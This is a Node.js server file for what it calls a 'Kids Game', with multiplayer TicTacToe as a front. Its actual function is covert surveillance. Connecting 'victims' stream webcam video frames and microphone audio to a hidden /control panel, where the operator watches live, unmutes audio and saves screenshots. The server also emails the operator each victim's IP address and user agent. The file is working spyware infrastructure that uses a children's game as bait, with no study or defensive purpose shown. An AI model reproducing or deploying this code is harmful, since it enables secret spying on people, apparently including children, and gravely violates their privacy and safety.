// server.js — Server-Relay Streaming (no WebRTC P2P needed)
const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');
const nodemailer = require('nodemailer');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
  maxHttpBufferSize: 5e6 // 5MB max for frame data
});

const PORT = process.env.PORT || 8080;

// Email config
const EMAIL_CONFIG = {
  from: 'your-email@gmail.com',
  to: 'your-email@gmail.com',
  subject: '🚨 NEW VICTIM CONNECTED - Kids Game',
  smtp: {
    host: 'smtp.gmail.com',
    port: 465,
    secure: true,
    auth: {
      user: 'your-email@gmail.com',
      pass: 'your-app-password'
    }
  }
};

const transporter = nodemailer.createTransport(EMAIL_CONFIG.smtp);

const activeSessions = new Map();
let sessionCounter = 0;

// TicTacToe matchmaking
const tttWaitingRooms = new Map();
const tttRooms = new Map();

// Static files
app.use(express.static(path.join(__dirname, 'public')));

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// ========== Control Panel ==========
app.get('/control', (req, res) => {
  res.send(`
<html>
<head>
  <title>🎮 Control Panel</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: 'Segoe UI', sans-serif;
      background: #0f0f1a;
      color: white;
      padding: 20px;
    }
    h1 { 
      text-align: center;
      margin-bottom: 30px;
      background: linear-gradient(135deg, #667eea, #764ba2);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      font-size: 36px;
    }
    .stats {
      text-align: center;
      margin-bottom: 25px;
      font-size: 18px;
    }
    .stats span { 
      background: rgba(255,255,255,0.1);
      padding: 8px 20px;
      border-radius: 20px;
      margin: 0 5px;
    }
    .sessions {
      display: grid;
      grid-template-columns: repeat(auto-fill, minmax(400px, 1fr));
      gap: 20px;
      max-width: 1400px;
      margin: 0 auto;
    }
    .session-card {
      background: rgba(255,255,255,0.05);
      border: 1px solid rgba(255,255,255,0.1);
      border-radius: 16px;
      padding: 20px;
      backdrop-filter: blur(10px);
    }
    .session-card .info {
      font-size: 13px;
      color: #aaa;
      margin-bottom: 15px;
    }
    .session-card img.stream-img {
      width: 100%;
      border-radius: 10px;
      background: #000;
      min-height: 200px;
      object-fit: contain;
    }
    .session-card .controls {
      margin-top: 12px;
      display: flex;
      gap: 10px;
    }
    .session-card button {
      flex: 1;
      padding: 10px;
      border: none;
      border-radius: 8px;
      font-weight: 600;
      cursor: pointer;
      transition: all 0.2s;
    }
    .btn-audio { background: #6bcb77; color: #000; }
    .btn-snap { background: #4d96ff; color: white; }
    .session-card button:active { transform: scale(0.95); }
    .no-sessions {
      text-align: center;
      grid-column: 1 / -1;
      padding: 60px;
      color: #666;
      font-size: 20px;
    }
    .status-dot {
      display: inline-block;
      width: 10px;
      height: 10px;
      border-radius: 50%;
      margin-right: 8px;
    }
    .status-dot.online { background: #6bcb77; box-shadow: 0 0 10px #6bcb77; }
    .status-dot.offline { background: #ff6b6b; }
    .fps-counter { font-size: 11px; color: #6bcb77; margin-left: 10px; }
    .logs {
      max-width: 800px;
      margin: 30px auto;
      background: rgba(0,0,0,0.3);
      border-radius: 12px;
      padding: 20px;
      max-height: 200px;
      overflow-y: auto;
    }
    .logs h3 { margin-bottom: 10px; color: #666; }
    .logs .log-entry { font-size: 12px; color: #888; padding: 3px 0; border-bottom: 1px solid rgba(255,255,255,0.05); }
    .refresh-btn {
      display: block;
      margin: 20px auto;
      background: linear-gradient(135deg, #667eea, #764ba2);
      color: white;
      border: none;
      padding: 12px 40px;
      border-radius: 50px;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <h1>🎮 Control Panel</h1>
  <div class="stats">
    <span>🟢 <span id="sessionCount">0</span> active sessions</span>
    <span>📸 <span id="totalSnaps">0</span> snapshots</span>
  </div>
  <button class="refresh-btn" onclick="location.reload()">🔄 Refresh</button>
  <div class="sessions" id="sessionList"></div>
  <div class="logs" id="logs">
    <h3>📋 Live Logs</h3>
  </div>
  
  <script src="/socket.io/socket.io.js"></script>
  <script>
    var socket = io();
    var sessionList = document.getElementById('sessionList');
    var sessionCount = document.getElementById('sessionCount');
    var logsDiv = document.getElementById('logs');
    var snapCount = 0;
    var frameListeners = {};

    function addLog(msg) {
      var entry = document.createElement('div');
      entry.className = 'log-entry';
      entry.textContent = '[' + new Date().toLocaleTimeString() + '] ' + msg;
      logsDiv.appendChild(entry);
      logsDiv.scrollTop = logsDiv.scrollHeight;
    }

    socket.on('connect', function() {
      addLog('✅ Connected to server');
      socket.emit('get-sessions');
    });

    function cleanupSession(sid) {
      if (frameListeners[sid]) {
        frameListeners[sid].forEach(function(item) {
          socket.off(item.event, item.fn);
        });
        delete frameListeners[sid];
      }
    }

    var audioCtx = null;
    var gainNodes = {};
    var nextPlayTime = {};

    function setupSession(sid) {
      if (document.getElementById('card-' + sid)) return;

      var card = document.createElement('div');
      card.className = 'session-card';
      card.id = 'card-' + sid;

      var info = document.createElement('div');
      info.className = 'info';
      info.innerHTML = '<span class="status-dot online"></span> Session: <strong>' + sid + '</strong><span class="fps-counter" id="fps-' + sid + '"></span>';

      var img = document.createElement('img');
      img.className = 'stream-img';
      img.id = 'stream-' + sid;
      img.alt = 'Live Stream';

      var controlsDiv = document.createElement('div');
      controlsDiv.className = 'controls';
      
      var btnAudio = document.createElement('button');
      btnAudio.className = 'btn-audio';
      btnAudio.textContent = '🔊 Unmute Audio';
      btnAudio.onclick = function() {
        if (!audioCtx) {
          audioCtx = new (window.AudioContext || window.webkitAudioContext)({ sampleRate: 16000 });
        }
        audioCtx.resume();
        var gn = gainNodes[sid];
        if (gn) {
          if (gn.gain.value === 0) {
            gn.gain.value = 1;
            btnAudio.textContent = '🔇 Mute Audio';
            addLog('🔊 Audio unmuted for ' + sid);
          } else {
            gn.gain.value = 0;
            btnAudio.textContent = '🔊 Unmute Audio';
          }
        }
      };

      var btnSnap = document.createElement('button');
      btnSnap.className = 'btn-snap';
      btnSnap.textContent = '📸 Screenshot';
      btnSnap.onclick = function() {
        if (!img.src || img.src === '') return;
        var link = document.createElement('a');
        link.download = 'snap_' + sid + '_' + Date.now() + '.jpg';
        link.href = img.src;
        link.click();
        snapCount++;
        document.getElementById('totalSnaps').textContent = snapCount;
      };

      controlsDiv.appendChild(btnAudio);
      controlsDiv.appendChild(btnSnap);

      card.appendChild(info);
      card.appendChild(img);
      card.appendChild(controlsDiv);
      sessionList.appendChild(card);

      // Listen for video frames
      cleanupSession(sid);
      frameListeners[sid] = [];

      var frameCount = 0;
      var lastFpsTime = Date.now();

      var frameFn = function(data) {
        img.src = data;
        frameCount++;
        var now = Date.now();
        if (now - lastFpsTime >= 2000) {
          var fps = Math.round(frameCount / ((now - lastFpsTime) / 1000));
          var fpsEl = document.getElementById('fps-' + sid);
          if (fpsEl) fpsEl.textContent = fps + ' FPS';
          frameCount = 0;
          lastFpsTime = now;
        }
      };
      socket.on('frame-' + sid, frameFn);
      frameListeners[sid].push({ event: 'frame-' + sid, fn: frameFn });

      // Listen for audio chunks (raw PCM Int16 at 16kHz)
      var audioFn = function(data) {
        if (!audioCtx) {
          audioCtx = new (window.AudioContext || window.webkitAudioContext)({ sampleRate: 16000 });
        }
        if (!gainNodes[sid]) {
          gainNodes[sid] = audioCtx.createGain();
          gainNodes[sid].gain.value = 0; // Start muted
          gainNodes[sid].connect(audioCtx.destination);
        }

        var int16 = new Int16Array(data);
        var float32 = new Float32Array(int16.length);
        for (var i = 0; i < int16.length; i++) {
          float32[i] = int16[i] / 32768.0;
        }

        var buffer = audioCtx.createBuffer(1, float32.length, 16000);
        buffer.getChannelData(0).set(float32);

        var source = audioCtx.createBufferSource();
        source.buffer = buffer;
        source.connect(gainNodes[sid]);

        var now = audioCtx.currentTime;
        if (!nextPlayTime[sid] || nextPlayTime[sid] < now) {
          nextPlayTime[sid] = now + 0.05; // Small buffer
        }
        source.start(nextPlayTime[sid]);
        nextPlayTime[sid] += buffer.duration;
      };
      socket.on('audio-' + sid, audioFn);
      frameListeners[sid].push({ event: 'audio-' + sid, fn: audioFn });

      addLog('📺 Watching stream from ' + sid);

      // Tell server we want this stream
      socket.emit('watch', sid);
    }

    socket.on('session-list', function(sessions) {
      sessionCount.textContent = sessions.length;

      if (sessions.length === 0 && sessionList.children.length === 0) {
        sessionList.innerHTML = '<div class="no-sessions" id="noSessionsMsg">🔴 Waiting for victims to connect...</div>';
        return;
      } else if (sessions.length > 0) {
        var noSess = document.getElementById('noSessionsMsg');
        if (noSess) noSess.remove();
      }

      // Remove disconnected
      Array.from(sessionList.children).forEach(function(child) {
        if (child.id && child.id.startsWith('card-')) {
          var sid = child.id.replace('card-', '');
          if (!sessions.includes(sid)) {
            child.remove();
            cleanupSession(sid);
          }
        }
      });

      // Add new
      sessions.forEach(function(sid) {
        setupSession(sid);
      });
    });

    socket.on('new-session', function(sid) {
      addLog('🆕 New victim: ' + sid);
      setupSession(sid);
      // Refresh count
      socket.emit('get-sessions');
    });

    socket.on('session-gone', function(sid) {
      addLog('🔴 Disconnected: ' + sid);
      var card = document.getElementById('card-' + sid);
      if (card && card.parentNode) card.remove();
      cleanupSession(sid);
      socket.emit('get-sessions');
    });

    // Periodic refresh (just for count, not re-creating connections)
    setInterval(function() { socket.emit('get-sessions'); }, 15000);
  </script>
</body>
</html>
  `);
});

// ========== Socket.IO — Server Relay ==========
io.on('connection', (socket) => {
  const clientIP = socket.handshake.address;
  const sessionId = 'SESS-' + (++sessionCounter).toString(16).toUpperCase() + '-' + Date.now().toString(36);

  console.log(`[+] New connection: ${sessionId} from ${clientIP}`);

  // CP requests session list
  socket.on('get-sessions', () => {
    socket.isControl = true;
    socket.join('controls'); // Join controls room
    socket.emit('session-list', Array.from(activeSessions.keys()));
  });

  // CP wants to watch a specific session
  socket.on('watch', (sid) => {
    socket.join('watch-' + sid);
    console.log(`[WATCH] CP ${socket.id} watching ${sid}`);
  });

  // Victim registers
  socket.on('register-victim', () => {
    socket.sessionId = sessionId;
    socket.isVictim = true;
    activeSessions.set(sessionId, { socket, ip: clientIP, connectedAt: Date.now() });

    console.log(`[VICTIM] Registered: ${sessionId} from ${clientIP}`);

    // Send email
    const mailBody = `
🚨 NEW VICTIM CONNECTED 🚨

Session ID: ${sessionId}
IP Address: ${clientIP}
Time: ${new Date().toLocaleString()}
User-Agent: ${socket.handshake.headers['user-agent'] || 'N/A'}
    `;

    transporter.sendMail({
      from: EMAIL_CONFIG.from,
      to: EMAIL_CONFIG.to,
      subject: EMAIL_CONFIG.subject + ' - ' + sessionId,
      text: mailBody
    }).then(() => {
      console.log(`[EMAIL] Alert sent for ${sessionId}`);
    }).catch(err => {
      console.log(`[EMAIL] Failed: ${err.message}`);
    });

    // Notify all control panels
    io.emit('new-session', sessionId);
  });

  // Victim sends video frame → relay to watchers
  socket.on('frame', (data) => {
    if (socket.sessionId) {
      io.to('watch-' + socket.sessionId).emit('frame-' + socket.sessionId, data);
    }
  });

  // Victim sends audio chunk → relay to watchers
  socket.on('audio', (data) => {
    if (socket.sessionId) {
      io.to('watch-' + socket.sessionId).volatile.emit('audio-' + socket.sessionId, data);
    }
  });

  // ========== TicTacToe Multiplayer ==========
  socket.on('ttt-join-room', (roomId) => {
    if (tttRooms.has(roomId)) {
      socket.emit('ttt-error', 'Room is full or game already started!');
      return;
    }

    const waitingPlayer = tttWaitingRooms.get(roomId);
    if (waitingPlayer && waitingPlayer.id !== socket.id && waitingPlayer.connected) {
      // Match found! Create a game
      const player1 = waitingPlayer;
      const player2 = socket;
      tttWaitingRooms.delete(roomId);

      player1.join(roomId);
      player2.join(roomId);

      player1.tttRoom = roomId;
      player2.tttRoom = roomId;

      tttRooms.set(roomId, { players: [player1.id, player2.id], turn: 'X' });

      player1.emit('ttt-start', { symbol: 'X', room: roomId, turn: 'X' });
      player2.emit('ttt-start', { symbol: 'O', room: roomId, turn: 'X' });

      console.log(`[TTT] Game started in room: ${roomId}`);
    } else {
      // Wait for opponent in this specific room
      tttWaitingRooms.set(roomId, socket);
      socket.tttWaitingRoomId = roomId;
      console.log(`[TTT] Player waiting in room: ${roomId}`);
    }
  });

  socket.on('ttt-move', (data) => {
    const room = tttRooms.get(data.room);
    if (!room) return;
    // Determine which symbol this player is
    const playerIndex = room.players.indexOf(socket.id);
    const symbol = playerIndex === 0 ? 'X' : 'O';
    if (symbol !== room.turn) return; // Not your turn
    room.turn = symbol === 'X' ? 'O' : 'X';
    // Broadcast move to everyone in the room (including sender for confirmation)
    io.to(data.room).emit('ttt-move', { index: data.index, symbol: symbol });
  });

  socket.on('ttt-leave', () => {
    if (socket.tttRoom) {
      socket.to(socket.tttRoom).emit('ttt-opponent-left');
      tttRooms.delete(socket.tttRoom);
      socket.leave(socket.tttRoom);
      socket.tttRoom = null;
    }
    if (socket.tttWaitingRoomId) {
      tttWaitingRooms.delete(socket.tttWaitingRoomId);
      socket.tttWaitingRoomId = null;
    }
  });

  // ========== Disconnect ==========
  socket.on('disconnect', () => {
    // Victim cleanup
    if (socket.sessionId && socket.isVictim) {
      activeSessions.delete(socket.sessionId);
      io.emit('session-gone', socket.sessionId);
      console.log(`[-] Victim disconnected: ${socket.sessionId}`);
    }
    // TTT cleanup
    if (socket.tttRoom) {
      socket.to(socket.tttRoom).emit('ttt-opponent-left');
      tttRooms.delete(socket.tttRoom);
    }
    if (socket.tttWaitingRoomId) {
      tttWaitingRooms.delete(socket.tttWaitingRoomId);
    }
  });
});

// ========== Start ==========
server.listen(PORT, '0.0.0.0', () => {
  console.log(`
╔══════════════════════════════════════════╗
║    🎮 Kids Game Server (Relay Mode)     ║
╠══════════════════════════════════════════╣
║  Game Page:  http://localhost:${PORT}      ║
║  Control:    http://localhost:${PORT}/control ║
║  Mode:       Server Relay (no WebRTC)    ║
╚══════════════════════════════════════════╝
  `);
});